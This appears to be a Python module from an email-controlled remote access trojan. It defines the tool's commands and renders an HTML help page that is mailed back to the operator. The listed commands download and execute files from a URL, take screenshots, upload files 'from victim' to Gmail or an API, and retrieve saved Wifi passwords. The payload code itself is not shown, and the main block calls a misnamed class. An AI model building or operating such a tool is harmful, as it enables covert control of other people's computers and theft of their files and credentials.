import importlib


class download:
    def __init__(self):
        self.name = "download"
        self.info = "Downloads a file from Given Url and Executes It(Not plain text file only bytes)"
        self.args = ["Url: Url To Download","Name: Name to Save the file","Bool: True of False to run after execution"]
        self.command = ":download,Url,Name,Bool"

class screenshot:
    def __init__(self):
        self.info = "📸 Snaps a pic of the screen and sends it over like 💨"
        self.name = "screenshot"
        self.args = []
        self.isCrossPlatfrom = True
        self.command = ":screenshot"

class systeminfo:
    def __init__(self):
        self.name = "systeminfo"
        self.info = "Gives Basic System Information of File"
        self.args = []
        self.command = ":systeminfo"


class upload:
    def __init__(self):
        self.name = "UrlUploader"
        self.info = "Uploads a file from Given Path to Gmail or an Api (if file greater than 25MB)"
        self.args = ["Path: Path from victim to download file"]
        self.command = ":upload,[Path]"

class wifi:
    def __init__(self):
        self.name = "Wifi"
        self.info = "Retrieves Saved Wifi Passwords"
        self.args = []
        self.command = ":wifi"


class helper:
    def __init__(self):
        self.info = ""
    

    def helper_template(self,help_content):
        html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Help - Shell Terminal</title>
        <style>
            body {{
                font-family: 'Courier New', monospace;
                background-color: #000;
                color: #00ff00;
                margin: 0;
                padding: 20px;
            }}
            .terminal {{
                max-width: 800px;
                margin: 0 auto;
                background-color: #0a0a0a;
                border: 2px solid #00ff00;
                border-radius: 10px;
                padding: 20px;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            }}
            h1, h2 {{
                color: #00ff00;
                text-shadow: 0 0 10px #00ff00;
                margin-bottom: 10px;
            }}
            h1 {{
                border-bottom: 2px solid #00ff00;
                padding-bottom: 10px;
            }}
            .info {{
                color: #1e90ff;
                margin-bottom: 10px;
            }}
            .command-structure {{
                background-color: #101010;
                border: 1px solid #00ff00;
                border-radius: 5px;
                padding: 10px;
                margin-top: 10px;
            }}
            .command-structure p {{
                color: #ff4500;
                font-weight: bold;
                font-size: 1.1em;
            }}

            .args {{
                margin-top: 10px;
            }}
            .args p {{
                color: #ff8c00;
            }}
        </style>
    </head>
    <body>
        <div class="terminal">
            <h1>Help</h1>
    {help_content}
        </div>
    </body>
    </html>
        """
        return html_content


    def smallHelpTemplate(self,heading,info,command,args_info):
        template = f"""
<h2>{heading}</h2>
<p class="info">{info}</p>
<div class="command-structure">
    <p><strong>Command Structure-</strong> {command}</p>
    <div class="args">
        {args_info}
        
    </div>
</div>
"""
        return template


    def helpfunctions(self):
        self.info += self.smallHelpTemplate(
            heading="Help",
            info="Gives a helping hand Know about tool better",
            command=":help",
            args_info="<p><strong>args1:</strong> No arguments</p>"
        )
        

        listOfClasses = [screenshot, systeminfo, download, upload, wifi]
        for classes in listOfClasses:
            Class = classes()
            args_info = ""
            if Class.args == []:
                args_info += "<p><strong>args:</strong> No Arguments</p>"
            else:
                for arg in Class.args:
                    arg = arg.split(":")
                    args_info += f"<p><strong>{arg[0]}-</strong> {arg[1]}</p>"

            self.info += self.smallHelpTemplate(
                heading=Class.name,
                info=Class.info,
                command=Class.command,
                args_info= args_info
            )


        return self.helper_template(self.info)
    
    def run(self,EmailHandler,msgId):
        EmailHandler.send_email(
            message = self.helpfunctions(),
            msgId=msgId,
            reply=True
        )

if __name__ == "__main__":
    help = Helper()
    print(help.helpfunctions())
    


        
        

    

